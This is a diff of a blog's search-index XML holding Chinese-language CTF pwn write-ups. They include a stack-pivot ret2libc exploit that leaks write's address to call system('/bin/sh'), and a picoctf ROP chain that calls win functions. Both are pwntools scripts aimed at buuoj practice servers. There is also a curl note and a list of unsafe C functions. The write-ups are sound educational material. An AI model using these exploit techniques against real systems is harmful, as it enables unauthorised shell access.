+<p>curl 命令在 Linux 操作系统中经常来测试网络和 url 的联通性，模拟正常的网络访问。除此之外，curl<br>还支持包括 HTTP、HTTPS、ftp 等众多协议，还支持 POST、cookies、认证、从指定偏移处下载部分文<br>件等功能<br>1.curl url(获取网址的文本信息)<br>2.curl -i url(获取文本的头部及文本信息)<br>3.curl -x proxy url(使用代理请求网页内容)<br>4.curl -v(获取整个通信过程)<br>5.curl -X url(使用特定方法请求网页文本)<br>6.curl -I url(仅返回头部信息)</p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>笔记</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ciscn_s_3</title>
     <url>/2021/06/28/ciscn-s-3/</url>
     <content><![CDATA[<h1 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h1><p>检查保护机制，64位，开NX</p>
@@ -826,20 +840,6 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
       </categories>
       <tags>
         <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CURL</title>
-    <url>/2021/06/17/curl%E5%91%BD%E4%BB%A4%EF%BC%88http%E8%AF%B7%E6%B1%82%EF%BC%89/</url>
-    <content><![CDATA[<h1 id="curl-命令"><a href="#curl-命令" class="headerlink" title="curl 命令"></a>curl 命令</h1><span id="more"></span>
-
-<p>curl 命令在 Linux 操作系统中经常来测试网络和 url 的联通性，模拟正常的网络访问。除此之外，curl<br>还支持包括 HTTP、HTTPS、ftp 等众多协议，还支持 POST、cookies、认证、从指定偏移处下载部分文<br>件等功能<br>1.curl url(获取网址的文本信息)<br>2.curl -i url(获取文本的头部及文本信息)<br>3.curl -x proxy url(使用代理请求网页内容)<br>4.curl -v(获取整个通信过程)<br>5.curl -X url(使用特定方法请求网页文本)<br>6.curl -I url(仅返回头部信息)</p>
-]]></content>
-      <categories>
-        <category>笔记</category>
-      </categories>
-      <tags>
-        <tag>笔记</tag>
       </tags>
   </entry>
   <entry>
@@ -972,75 +972,6 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
       </tags>
   </entry>
   <entry>
-    <title>pwn1</title>
-    <url>/2021/07/15/pwn1/</url>
-    <content><![CDATA[<h2 id="Black-Watch-入群题-PWN"><a href="#Black-Watch-入群题-PWN" class="headerlink" title="[Black Watch 入群题]PWN"></a>[Black Watch 入群题]PWN</h2><p>检查保护机制，32位，开NX</p>
-<p><img src="/img/image-20210715112542782.png" alt="image-20210715112542782"></p>
-<p>IDA打开，查看main函数，看到vul_function()函数</p>
-<p><img src="/img/image-20210715112703453.png" alt="image-20210715112703453"></p>
-<p><img src="/img/image-20210715112745902.png" alt="image-20210715112745902"></p>
-<pre class="line-numbers language-none"><code class="language-none">虽然buf在栈上但输入的长度仅仅能够覆盖ebp和返回地址，但s在bss段，而且输入的长度也够长，因此想到了栈迁移，覆盖vul_function返回地址，使其到bss段上执行<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-
-
-<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>找到s在bss段中的位置是0x804A300</p>
-<p><img src="/img/image-20210715113306340.png" alt="image-20210715113306340"></p>
-<p>在bss段的s上需要调用system(“/bin/sh”)，但没有提供system和”/bin/sh”的地址，还需要写个ROP链，先泄露write函数的真实地址，再利用LibcSearcher函数可以根据泄露的地址找到相应的libc版本,从而得到system和”/bin/sh”的地址。</p>
-<h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p>注意:发现做题久了之后，libc版本的问题，如果虚拟机LibcSearcher每次搜出来的libc版本都不是想要的版本，其实有个libc-2.23就可以了，大部分题用2.23都可以跑出来，2.23yyds！</p>
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python2</span>
-<span class="token comment">#coding=utf-8</span>
-<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-<span class="token comment">#</span>
-<span class="token comment"># from LibcSearcher import *</span>
-
-context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">"linux"</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">"i386"</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span> <span class="token string">"debug"</span><span class="token punctuation">)</span>
-p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node4.buuoj.cn"</span><span class="token punctuation">,</span> <span class="token number">27426</span><span class="token punctuation">)</span>
-
-elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"spwn"</span><span class="token punctuation">)</span>
-
-bss_s <span class="token operator">=</span> <span class="token number">0x0804A300</span>				<span class="token comment">#将fake栈迁移到bss中</span>
-leave_ret <span class="token operator">=</span> <span class="token number">0x08048511</span>			<span class="token comment">#栈迁移所需要的的地址</span>
-write_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"write"</span><span class="token punctuation">]</span>	<span class="token comment">#plt表可以调用write函数</span>
-write_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"write"</span><span class="token punctuation">]</span>	<span class="token comment">#got表里有write函数的真实地址</span>
-main_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"main"</span><span class="token punctuation">]</span>	<span class="token comment">#控制函数执行流需要再次回到主函数</span>
-<span class="token comment"># 需要打印出write的真实地址查出，并且让函数再次返回主函数</span>
-payload <span class="token operator">=</span> <span class="token string">b"aaaa"</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>write_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span>
-payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
-p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"name?"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
-<span class="token comment"># 上面将一些执行流程写入了bss段</span>
-<span class="token comment"># 接下来的写入的buf在栈上，所以可以控制程序执行到bss段</span>
-payload <span class="token operator">=</span> <span class="token string">b"a"</span> <span class="token operator">*</span> <span class="token number">0x18</span> <span class="token comment">#这个payload是写到栈上进行栈迁移的，所以先填充到ebp之前</span>
-payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>bss_s<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>
-p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"say?"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
-
-write_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#接收泄露的地址</span>
-<span class="token comment">#libc = LibcSearcher("write", write_addr) #利用LibcSearcher函数可以根据泄露的地址找到相应的libc版本</span>
-libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc-2.23.so"</span><span class="token punctuation">)</span>
-libc_base <span class="token operator">=</span> write_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"write"</span><span class="token punctuation">]</span><span class="token comment">#获取libc的基地址</span>
-system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token comment">#通过获取到的libc的基地址和system在libc中的偏移量可以得到system在程序中的真实地址</span>
-binsh_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#通过获取到的libc的基地址和"/bin/sh"在libc中的地址可以得到"/bin/sh"在程序中的真实地址</span>
-<span class="token comment"># 第一次执行得到system函数地址后接下来会再次执行main函数</span>
-<span class="token comment"># 在这次有system函数的情况下再次进行相同的栈迁移执行system('/bin/sh')</span>
-payload <span class="token operator">=</span> <span class="token string">b"aaaa"</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span>
-payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>
-p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"name?"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
-
-payload <span class="token operator">=</span> <span class="token string">b"a"</span> <span class="token operator">*</span> <span class="token number">0x18</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bss_s<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>
-p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"say?"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
-
-p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><img src="/img/image-20210715120438512.png" alt="image-20210715120438512"></p>
-]]></content>
-      <categories>
-        <category>writeup</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>jarvisoj_level3</title>
     <url>/2021/06/28/jarvisoj-level3/</url>
     <content><![CDATA[<h1 id="jarvisoj-level3"><a href="#jarvisoj-level3" class="headerlink" title="jarvisoj_level3"></a>jarvisoj_level3</h1><p>检查保护机制，32位，开NX</p>
@@ -1105,6 +1036,125 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
 
 <p>cat flag</p>
 <p><img src="/img/image-20210706133135129.png" alt="image-20210706133135129"></p>
+]]></content>
+      <categories>
+        <category>writeup</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>picoctf_2018_rop</title>
+    <url>/2021/07/17/picoctf-2018-rop/</url>
+    <content><![CDATA[<h1 id="picoctf-2018-rop-chain"><a href="#picoctf-2018-rop-chain" class="headerlink" title="picoctf_2018_rop chain"></a>picoctf_2018_rop chain</h1><p>检查保护机制，32位，开NX</p>
+<p><img src="/img/image-20210717100253970.png" alt="image-20210717100253970"></p>
+<p>IDA打开</p>
+<p>main函数，里面发现vuln函数</p>
+<p><img src="/img/image-20210717100706788.png" alt="image-20210717100706788"></p>
+<p><img src="/img/image-20210717100744059.png" alt="image-20210717100744059"></p>
+<h4 id="漏洞点：没有限制输入字符串长度"><a href="#漏洞点：没有限制输入字符串长度" class="headerlink" title="漏洞点：没有限制输入字符串长度"></a>漏洞点：没有限制输入字符串长度</h4><p>然后发现了一个flag函数，仔细查看后发现这是一个后门函数</p>
+<p><img src="/img/image-20210717101317225.png" alt="image-20210717101317225"></p>
+<p>win_function1函数</p>
+<p><img src="/img/image-20210717101703475.png" alt="image-20210717101703475"></p>
+<p>win_function2函数</p>
+<p><img src="/img/image-20210717101752632.png" alt="image-20210717101752632"></p>
+<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><pre class="line-numbers language-none"><code class="language-none">需要注意点就是，有个判断 条件if ( win1 &amp;&amp; win2 &amp;&amp; a1 &#x3D;&#x3D; -559039827 )，需要控制win1、win2、a1
+win1、win2可以通过调用对应的函数进行赋值，而a1是作为flag函数的参数，在栈上构造好数据即可<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>先对win1赋值，使win1=1</p>
+<p>然后当win_function2的参数a1=-1163220307，对win2进行赋值，win2=1</p>
+<h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
+
+context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">"linux"</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">"i386"</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span> <span class="token string">"debug"</span><span class="token punctuation">)</span>
+p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node4.buuoj.cn"</span><span class="token punctuation">,</span> <span class="token number">28400</span><span class="token punctuation">)</span>
+
+win_function1 <span class="token operator">=</span> <span class="token number">0x080485CB</span>
+win_function2 <span class="token operator">=</span> <span class="token number">0x080485D8</span>
+flag <span class="token operator">=</span> <span class="token number">0x0804862B</span>
+
+payload <span class="token operator">=</span> <span class="token string">"a"</span> <span class="token operator">*</span> <span class="token number">0x1c</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>win_function1<span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>win_function2<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0xBAAAAAAD</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0xDEADBAAD</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"input> "</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="注："><a href="#注：" class="headerlink" title="注："></a>注：</h4><pre class="line-numbers language-none"><code class="language-none">0xBAAAAAAD是-1163220307对应的16进制的补码作为win_function2函数的参数
+0xDEADBAAD是-559039827对应的16进制的补码作为flag函数的参数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><img src="/img/image-20210717103414365.png" alt="image-20210717103414365"></p>
+]]></content>
+      <categories>
+        <category>writeup</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>pwn1</title>
+    <url>/2021/07/15/pwn1/</url>
+    <content><![CDATA[<h2 id="Black-Watch-入群题-PWN"><a href="#Black-Watch-入群题-PWN" class="headerlink" title="[Black Watch 入群题]PWN"></a>[Black Watch 入群题]PWN</h2><p>检查保护机制，32位，开NX</p>
+<p><img src="/img/image-20210715112542782.png" alt="image-20210715112542782"></p>
+<p>IDA打开，查看main函数，看到vul_function()函数</p>
+<p><img src="/img/image-20210715112703453.png" alt="image-20210715112703453"></p>
+<p><img src="/img/image-20210715112745902.png" alt="image-20210715112745902"></p>
+<pre class="line-numbers language-none"><code class="language-none">虽然buf在栈上但输入的长度仅仅能够覆盖ebp和返回地址，但s在bss段，而且输入的长度也够长，因此想到了栈迁移，覆盖vul_function返回地址，使其到bss段上执行<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>找到s在bss段中的位置是0x804A300</p>
+<p><img src="/img/image-20210715113306340.png" alt="image-20210715113306340"></p>
+<p>在bss段的s上需要调用system(“/bin/sh”)，但没有提供system和”/bin/sh”的地址，还需要写个ROP链，先泄露write函数的真实地址，再利用LibcSearcher函数可以根据泄露的地址找到相应的libc版本,从而得到system和”/bin/sh”的地址。</p>
+<h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p>注意:发现做题久了之后，libc版本的问题，如果虚拟机LibcSearcher每次搜出来的libc版本都不是想要的版本，其实有个libc-2.23就可以了，大部分题用2.23都可以跑出来，2.23yyds！</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python2</span>
+<span class="token comment">#coding=utf-8</span>
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token comment">#</span>
+<span class="token comment"># from LibcSearcher import *</span>
+
+context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">"linux"</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">"i386"</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span> <span class="token string">"debug"</span><span class="token punctuation">)</span>
+p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node4.buuoj.cn"</span><span class="token punctuation">,</span> <span class="token number">27426</span><span class="token punctuation">)</span>
+
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"spwn"</span><span class="token punctuation">)</span>
+
+bss_s <span class="token operator">=</span> <span class="token number">0x0804A300</span>				<span class="token comment">#将fake栈迁移到bss中</span>
+leave_ret <span class="token operator">=</span> <span class="token number">0x08048511</span>			<span class="token comment">#栈迁移所需要的的地址</span>
+write_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"write"</span><span class="token punctuation">]</span>	<span class="token comment">#plt表可以调用write函数</span>
+write_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"write"</span><span class="token punctuation">]</span>	<span class="token comment">#got表里有write函数的真实地址</span>
+main_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"main"</span><span class="token punctuation">]</span>	<span class="token comment">#控制函数执行流需要再次回到主函数</span>
+<span class="token comment"># 需要打印出write的真实地址查出，并且让函数再次返回主函数</span>
+payload <span class="token operator">=</span> <span class="token string">b"aaaa"</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>write_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"name?"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
+<span class="token comment"># 上面将一些执行流程写入了bss段</span>
+<span class="token comment"># 接下来的写入的buf在栈上，所以可以控制程序执行到bss段</span>
+payload <span class="token operator">=</span> <span class="token string">b"a"</span> <span class="token operator">*</span> <span class="token number">0x18</span> <span class="token comment">#这个payload是写到栈上进行栈迁移的，所以先填充到ebp之前</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>bss_s<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"say?"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
+
+write_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#接收泄露的地址</span>
+<span class="token comment">#libc = LibcSearcher("write", write_addr) #利用LibcSearcher函数可以根据泄露的地址找到相应的libc版本</span>
+libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc-2.23.so"</span><span class="token punctuation">)</span>
+libc_base <span class="token operator">=</span> write_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"write"</span><span class="token punctuation">]</span><span class="token comment">#获取libc的基地址</span>
+system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token comment">#通过获取到的libc的基地址和system在libc中的偏移量可以得到system在程序中的真实地址</span>
+binsh_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#通过获取到的libc的基地址和"/bin/sh"在libc中的地址可以得到"/bin/sh"在程序中的真实地址</span>
+<span class="token comment"># 第一次执行得到system函数地址后接下来会再次执行main函数</span>
+<span class="token comment"># 在这次有system函数的情况下再次进行相同的栈迁移执行system('/bin/sh')</span>
+payload <span class="token operator">=</span> <span class="token string">b"aaaa"</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"name?"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
+
+payload <span class="token operator">=</span> <span class="token string">b"a"</span> <span class="token operator">*</span> <span class="token number">0x18</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bss_s<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"say?"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/img/image-20210715120438512.png" alt="image-20210715120438512"></p>
 ]]></content>
       <categories>
         <category>writeup</category>
@@ -1189,56 +1239,6 @@ r<span class="token punctuation">.</span>sendline<span class="token punctuation"
 r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><img src="/img/image-20210706132149436.png" alt="image-20210706132149436"></p>
-]]></content>
-      <categories>
-        <category>writeup</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>picoctf_2018_rop</title>
-    <url>/2021/07/17/picoctf-2018-rop/</url>
-    <content><![CDATA[<h1 id="picoctf-2018-rop-chain"><a href="#picoctf-2018-rop-chain" class="headerlink" title="picoctf_2018_rop chain"></a>picoctf_2018_rop chain</h1><p>检查保护机制，32位，开NX</p>
-<p><img src="/img/image-20210717100253970.png" alt="image-20210717100253970"></p>
-<p>IDA打开</p>
-<p>main函数，里面发现vuln函数</p>
-<p><img src="/img/image-20210717100706788.png" alt="image-20210717100706788"></p>
-<p><img src="/img/image-20210717100744059.png" alt="image-20210717100744059"></p>
-<h4 id="漏洞点：没有限制输入字符串长度"><a href="#漏洞点：没有限制输入字符串长度" class="headerlink" title="漏洞点：没有限制输入字符串长度"></a>漏洞点：没有限制输入字符串长度</h4><p>然后发现了一个flag函数，仔细查看后发现这是一个后门函数</p>
-<p><img src="/img/image-20210717101317225.png" alt="image-20210717101317225"></p>
-<p>win_function1函数</p>
-<p><img src="/img/image-20210717101703475.png" alt="image-20210717101703475"></p>
-<p>win_function2函数</p>
-<p><img src="/img/image-20210717101752632.png" alt="image-20210717101752632"></p>
-<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><pre class="line-numbers language-none"><code class="language-none">需要注意点就是，有个判断 条件if ( win1 &amp;&amp; win2 &amp;&amp; a1 &#x3D;&#x3D; -559039827 )，需要控制win1、win2、a1
-win1、win2可以通过调用对应的函数进行赋值，而a1是作为flag函数的参数，在栈上构造好数据即可<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p>先对win1赋值，使win1=1</p>
-<p>然后当win_function2的参数a1=-1163220307，对win2进行赋值，win2=1</p>
-<h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
-
-context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">"linux"</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">"i386"</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span> <span class="token string">"debug"</span><span class="token punctuation">)</span>
-p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node4.buuoj.cn"</span><span class="token punctuation">,</span> <span class="token number">28400</span><span class="token punctuation">)</span>
-
-win_function1 <span class="token operator">=</span> <span class="token number">0x080485CB</span>
-win_function2 <span class="token operator">=</span> <span class="token number">0x080485D8</span>
-flag <span class="token operator">=</span> <span class="token number">0x0804862B</span>
-
-payload <span class="token operator">=</span> <span class="token string">"a"</span> <span class="token operator">*</span> <span class="token number">0x1c</span>
-payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>win_function1<span class="token punctuation">)</span>
-payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>win_function2<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0xBAAAAAAD</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0xDEADBAAD</span><span class="token punctuation">)</span>
-p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"input> "</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
-
-p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h4 id="注："><a href="#注：" class="headerlink" title="注："></a>注：</h4><pre class="line-numbers language-none"><code class="language-none">0xBAAAAAAD是-1163220307对应的16进制的补码作为win_function2函数的参数
-0xDEADBAAD是-559039827对应的16进制的补码作为flag函数的参数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p><img src="/img/image-20210717103414365.png" alt="image-20210717103414365"></p>
 ]]></content>
       <categories>
         <category>writeup</category>
@@ -1371,78 +1371,6 @@ io.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span>
 ]]></content>
       <categories>
         <category>笔记</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>一些危险函数和64位寄存器与32位不同之处</title>
-    <url>/2021/06/26/%E4%B8%80%E4%BA%9B%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%E5%92%8C64%E4%BD%8D%E5%AF%84%E5%AD%98%E5%99%A8%E4%B8%8E32%E4%BD%8D%E4%B8%8D%E5%90%8C%E4%B9%8B%E5%A4%84/</url>
-    <content><![CDATA[<span id="more"></span>
-<p>列举一下常见的危险函数：</p>
-<h4 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h4><pre><code>    gets，直接读取一行，忽略&#39;\x00&#39;
-    scanf
-    vscanf
-</code></pre>
-<h4 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h4><pre><code>    sprintf
-</code></pre>
-<h4 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h4><pre><code>    strcpy，字符串复制，遇到&#39;\x00&#39;停止
-    strcat，字符串拼接，遇到&#39;\x00&#39;停止
-    copy
-</code></pre>
